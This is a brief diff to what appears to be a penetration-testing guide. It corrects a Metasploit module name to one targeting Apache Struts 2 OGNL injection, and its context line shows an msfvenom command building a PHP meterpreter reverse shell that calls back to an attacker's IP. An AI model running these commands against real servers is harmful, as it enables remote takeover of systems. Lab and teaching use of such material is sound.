@@ -264,5 +264,6 @@ msfvenom -p php/meterpreter/reverseshell_tcp LHOST=your_ip LPORT=4444 -f raw > s
 
 ```
 msfconsole
-use exploit/multi/http/structs
+use exploit/multi/http/structs2_namespace_ognl
 ```
+
